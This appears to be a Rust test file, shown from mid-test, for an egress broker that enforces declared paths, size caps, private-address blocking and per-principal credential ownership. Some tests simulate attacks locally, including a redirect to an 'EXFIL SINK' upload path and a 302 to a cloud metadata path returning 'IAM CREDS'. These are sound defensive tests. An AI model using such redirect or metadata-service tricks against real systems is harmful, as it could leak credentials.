           -d '{{\"url\":\"{origin}/ok\",\"method\":\"GET\"}}' \"$AREEV_EGRESS_URL\" >/dev/null; \
         curl -s -X POST -H \"X-Areev-Egress-Token: $AREEV_EGRESS_TOKEN\" \
           -d '{{\"url\":\"{origin}/ok?second=1\",\"method\":\"GET\"}}' \"$AREEV_EGRESS_URL\" >/dev/null; \
         echo '{{\"done\":true}}'",
        origin = site.origin()
    ))
    .with_egress(EgressHandle::new(Arc::clone(&broker)));

    let runner = Runner {
        facade: Arc::clone(&facade),
        clock: Arc::new(ScriptedClock::new(
            (0..200).map(|i| 1_755_000_000_000 + i * 10).collect(),
        )),
        executor: Arc::new(exec),
        llm: None,
        observer: None,
        ns: "ops".into(),
        principal: "user:runner".into(),
    };
    runner
        .start(
            &plan,
            "r-calls",
            json!({}),
            &RunOptions {
                budgets: Default::default(),
                ask_ttl_sec: None,
                workers: 1,
                on_dangling: areev_run::OnDangling::Redispatch,
                llm_max_tokens: None,
                inject_crash: None,
            },
        )
        .unwrap();

    let obs = facade
        .with_store(|m| {
            m.recent_live_scoped(
                &[areev_core::authz::HARNESS_NS.to_string()],
                Some(areev_core::types::GrainType::Observation),
                50,
            )
        })
        .unwrap();
    let recorded: Vec<_> = obs
        .iter()
        .filter(|g| g.get_str("observation_kind") == Some("egress_call"))
        .collect();

    assert_eq!(recorded.len(), 2, "two calls, two audit facts: {recorded:?}");
    for r in &recorded {
        assert_eq!(r.get_str("run_id"), Some("r-calls"));
        assert_eq!(r.get_str("caller"), Some("reach"));
        assert_eq!(r.get_str("method"), Some("GET"));
        assert!(r.get_str("destination").unwrap_or_default().contains("/ok"));
        assert!(
            r.get_str("response_digest").unwrap_or_default().starts_with("sha256:"),
            "the body is a digest, never a body: {r:?}"
        );
        // An Observation is immutable and replicates; a mailbox body written
        // into one cannot be taken back.
        assert!(
            !format!("{r:?}").contains("upstream said hi"),
            "the response body must not be in the grain: {r:?}"
        );
    }
}

/// The declaration binds every hop, not just the first. An upstream on a
/// DECLARED path answers `302` pointing at an undeclared path on the same
/// (host-granted) origin — without the per-hop check, a redirect walks the
/// module from its `path_prefixes` to any endpoint the host grant tolerates.
#[test]
fn a_redirect_cannot_walk_a_capability_tool_off_its_declared_paths() {
    let site = Upstream::start(vec![
        ("/gmail/v1/users/me/go", 302, header("Location", "/upload/drive/v3/files"), ""),
        ("/upload/drive/v3/files", 200, Vec::new(), "EXFIL SINK"),
    ]);
    let broker = Broker::start(
        // The HOST grant is origin-wide: the second path is not blocked by it.
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        declaration(json!([{"http": {
            "hosts": [site.origin()],
            "path_prefixes": ["/gmail/v1/users/me/"]
        }}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/gmail/v1/users/me/go", site.origin()), "method": "GET" }),
    );
    assert_eq!(code, 403, "the hop must be refused by the DECLARATION: {body}");
    let paths: Vec<String> = site.requests().into_iter().map(|(_, p, _)| p).collect();
    assert_eq!(paths, vec!["/gmail/v1/users/me/go"], "the undeclared endpoint was never fetched");
    assert!(
        broker.refusals().iter().any(|r| r.reason.contains("redirect outside the declared capability")),
        "{:?}",
        broker.refusals()
    );
}

/// The response-byte ceiling bounds what the broker READS, not just what it
/// accepts: the refusal arrives without the oversized body ever being buffered
/// whole (`dispatch` reads at most cap + 1 bytes).
#[test]
fn a_capability_response_read_is_bounded_by_the_ceiling() {
    // 64 KiB body against a 16-byte cap — if the broker buffered it all, the
    // refusal would still fire, so the observable here is just that the refusal
    // fires; the bounded read is asserted by the code path (limit(cap+1)).
    let big: &'static str = Box::leak("x".repeat(65536).into_boxed_str());
    let site = Upstream::start(vec![("/big", 200, Vec::new(), big)]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        declaration(json!([{"http": {"hosts": [site.origin()]}}])),
        CapabilityLimits { max_calls: 8, max_response_bytes: 16 },
    );
    let token = broker.token_for("t").unwrap().to_string();
    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/big", site.origin()), "method": "GET" }));
    assert_eq!(code, 403, "{body}");
    assert!(body["error"].as_str().unwrap_or_default().contains("rather than truncated"), "{body}");
}

// ---- #101 follow-through: per-principal credentials -----------------------

/// A credential owned by principal A is refused for a run executing as B —
/// the scenario where one engine process holds several principals' secrets and
/// a run started on behalf of one must not spend another's.
#[test]
fn an_owned_credential_is_refused_for_a_different_principal() {
    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    std::env::set_var("AREEV_TEST_OWNED", "alice-secret");
    let (cred, owner) =
        Credential::bearer_from_env_spec("AREEV_TEST_OWNED@user:alice").unwrap();
    assert_eq!(owner.as_deref(), Some("user:alice"), "the owner parses off the spec");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), cred)].into_iter().collect(),
        // The TOOL grant admits the credential; ownership is the second gate.
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_OWNED");
    broker.bind_credential_owner("api", "user:alice");
    let token = broker.token_for("t").unwrap().to_string();
    let req = json!({ "url": format!("{}/x", site.origin()), "method": "GET", "credential": "api" });

    // Bound to Bob: refused, and nothing goes out.
    broker.bind_run_principal("user:bob");
    let (code, body) = ask(broker.url(), &token, req.clone());
    assert_eq!(code, 403, "a credential owned by alice must not serve bob's run: {body}");
    assert!(site.requests().is_empty(), "and the request is never made");
    assert!(
        broker.refusals().iter().any(|r| r.reason.contains("bound to principal 'user:alice'")),
        "{:?}",
        broker.refusals()
    );

    // Bound to Alice: it works.
    broker.bind_run_principal("user:alice");
    let (code, _) = ask(broker.url(), &token, req);
    assert_eq!(code, 200, "the owner's own run may spend it");
    assert_eq!(site.requests().len(), 1);
}

/// An owned credential fails CLOSED when no principal was bound at all — a
/// path that forgets to bind gets a refusal, never a leak.
#[test]
fn an_owned_credential_fails_closed_with_no_bound_principal() {
    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    std::env::set_var("AREEV_TEST_OWNED2", "s");
    let (cred, _) = Credential::bearer_from_env_spec("AREEV_TEST_OWNED2@user:alice").unwrap();
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), cred)].into_iter().collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_OWNED2");
    broker.bind_credential_owner("api", "user:alice");
    // NOTE: no bind_run_principal call at all.
    let token = broker.token_for("t").unwrap().to_string();
    let (code, _) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/x", site.origin()), "method": "GET", "credential": "api" }),
    );
    assert_eq!(code, 403, "unbound principal is not a free pass");
    assert!(site.requests().is_empty());
}

/// An UNOWNED credential is unaffected — the pre-#101 behaviour, every
/// existing deployment.
#[test]
fn an_unowned_credential_ignores_the_run_principal() {
    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    std::env::set_var("AREEV_TEST_UNOWNED", "shared");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), Credential::bearer_from_env("AREEV_TEST_UNOWNED").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_UNOWNED");
    broker.bind_run_principal("user:anyone");
    let token = broker.token_for("t").unwrap().to_string();
    let (code, _) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/x", site.origin()), "method": "GET", "credential": "api" }),
    );
    assert_eq!(code, 200, "no owner means no principal gate");
}

// ---- #101 follow-through: capability tools cannot reach private space -----

/// A capability tool under an UNRESTRICTED egress policy still cannot reach
/// loopback / private / metadata addresses on its declaration alone.
#[test]
fn a_capability_tool_cannot_reach_private_space_on_its_declaration_alone() {
    // A local service standing in for the console / hub / metadata endpoint.
    let local = Upstream::start(vec![("/admin", 200, Vec::new(), "LOCAL SECRET")]);
    let broker = Broker::start(
        // Unrestricted: no --allow-host. This is the permissive posture, and
        // the one where the declaration would otherwise be the only gate.
        EgressPolicy::unrestricted(),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    // The grain declares the loopback host — a synced memory can say anything.
    broker.declare(
        "t",
        declaration(json!([{"http": {"hosts": [local.origin()]}}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("t").unwrap().to_string();
    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/admin", local.origin()), "method": "GET" }),
    );
    assert_eq!(code, 403, "a declaration alone cannot authorize a private destination: {body}");
    assert!(local.requests().is_empty(), "the local service was never reached");
    assert!(
        broker.refusals().iter().any(|r| r.reason.contains("private or loopback")),
        "{:?}",
        broker.refusals()
    );
}

/// But an EXPLICIT --allow-host entry naming that local host lets it through:
/// the operator's auditable act is what authorizes local reach, not the grain.
#[test]
fn an_explicit_allow_host_authorizes_a_private_destination() {
    let local = Upstream::start(vec![("/ok", 200, Vec::new(), "reached")]);
    let broker = Broker::start(
        // The operator named it. That is the difference.
        policy_for(&[local.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        declaration(json!([{"http": {"hosts": [local.origin()]}}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("t").unwrap().to_string();
    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/ok", local.origin()), "method": "GET" }));
    assert_eq!(code, 200, "an explicit allowlist entry is the authorization: {body}");
    assert_eq!(body["body"], json!("reached"));
}

/// A non-capability caller (connector, --tool-cmd tool) is untouched by the
/// private-space rule — its reach was always pure host config, and an
/// unrestricted policy has always meant unrestricted for it.
#[test]
fn a_plain_caller_may_still_reach_a_local_service_when_unrestricted() {
    let local = Upstream::start(vec![("/ok", 200, Vec::new(), "fine")]);
    let broker = Broker::start(
        EgressPolicy::unrestricted(),
        Default::default(),
        EgressGrants::new().grant("plain", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    // No declare() — this caller is not a capability tool.
    let token = broker.token_for("plain").unwrap().to_string();
    let (code, _) =
        ask(broker.url(), &token, json!({ "url": format!("{}/ok", local.origin()), "method": "GET" }));
    assert_eq!(code, 200, "connectors keep the pre-#101 unrestricted behaviour");
}

/// The private-space rule binds redirect hops too: a public, declared start
/// that 302s to the metadata service is stopped at the hop.
#[test]
fn a_redirect_to_private_space_is_refused_for_a_capability_tool() {
    let meta = Upstream::start(vec![("/latest/meta-data/", 200, Vec::new(), "IAM CREDS")]);
    let pub_site = Upstream::start(vec![(
        "/go",
        302,
        header("Location", &format!("{}/latest/meta-data/", meta.origin())),
        "",
    )]);
    let broker = Broker::start(
        EgressPolicy::unrestricted(),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        // Declares both — a public start and, foolishly, the private target.
        declaration(json!([{"http": {"hosts": [pub_site.origin(), meta.origin()]}}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("t").unwrap().to_string();
    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/go", pub_site.origin()), "method": "GET" }));
    assert_eq!(code, 403, "the private hop is refused even though it is declared: {body}");
    assert!(meta.requests().is_empty(), "the metadata endpoint was never reached");
}

/// The driver binds the run's principal automatically — a real run started as
/// one principal cannot spend another's owned credential without anyone
/// calling `bind_run_principal` by hand.
#[cfg(unix)]
#[test]
fn the_driver_binds_the_run_principal_for_owned_credentials() {
    use areev_cal::AreevFacade;
    use areev_core::types::{Grain, Tool, ToolKind, Workflow};
    use areev_run::{CommandExecutor, EgressHandle, RunOptions, Runner, ScriptedClock};
    use areev_store::Areev;
    use tempfile::TempDir;

    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    let dir = TempDir::new().unwrap();
    let m = Areev::open(dir.path().join("m.db").to_str().unwrap()).unwrap();
    let facade = Arc::new(AreevFacade::new(m));
    let def = Tool::new("reach")
        .kind(ToolKind::Definition)
        .tool_description("calls out")
        .created_at(500)
        .namespace("ops");
    let dh = facade.with_store(|m| m.add(&def)).unwrap();
    let plan = facade
        .with_store(|m| {
            m.add(&Workflow::new(vec!["reach".into()]).bind("reach", &dh.to_hex()).created_at(600).namespace("ops"))
        })
        .unwrap();

    std::env::set_var("AREEV_TEST_DRIVER_OWNED", "alice-only");
    let (cred, _) = Credential::bearer_from_env_spec("AREEV_TEST_DRIVER_OWNED@user:alice").unwrap();
    let broker = Arc::new(
        Broker::start(
            policy_for(&[site.origin()]),
            [("api".to_string(), cred)].into_iter().collect(),
            EgressGrants::new().grant("reach", CallerGrant::new().credential("api")),
            "RUN-E022",
        )
        .unwrap(),
    );
    std::env::remove_var("AREEV_TEST_DRIVER_OWNED");
    broker.bind_credential_owner("api", "user:alice");

    let exec = CommandExecutor::new(&format!(
        "curl -s -X POST -H \"X-Areev-Egress-Token: $AREEV_EGRESS_TOKEN\" \
           -d '{{\"url\":\"{}/x\",\"method\":\"GET\",\"credential\":\"api\"}}' \
           \"$AREEV_EGRESS_URL\" >/dev/null; echo '{{\"done\":true}}'",
        site.origin()
    ))
    .with_egress(EgressHandle::new(Arc::clone(&broker)));

    // The run executes as BOB — not the owner. No manual bind_run_principal.
    let runner = Runner {
        facade: Arc::clone(&facade),
        clock: Arc::new(ScriptedClock::new((0..200).map(|i| 1_755_000_000_000 + i * 10).collect())),
        executor: Arc::new(exec),
        llm: None,
        observer: None,
        ns: "ops".into(),
        principal: "user:bob".into(),
    };
    runner
        .start(&plan, "r1", json!({}), &RunOptions {
            budgets: Default::default(),
            ask_ttl_sec: None,
            workers: 1,
            on_dangling: areev_run::OnDangling::Redispatch,
            llm_max_tokens: None,
            inject_crash: None,
        })
        .unwrap();

    assert!(site.requests().is_empty(), "bob's run must not spend alice's credential");
    let refusals = broker.refusals();
    assert!(
        refusals.iter().any(|r| r.reason.contains("bound to principal 'user:alice'")),
        "the driver bound bob and the broker refused: {refusals:?}"
    );
}
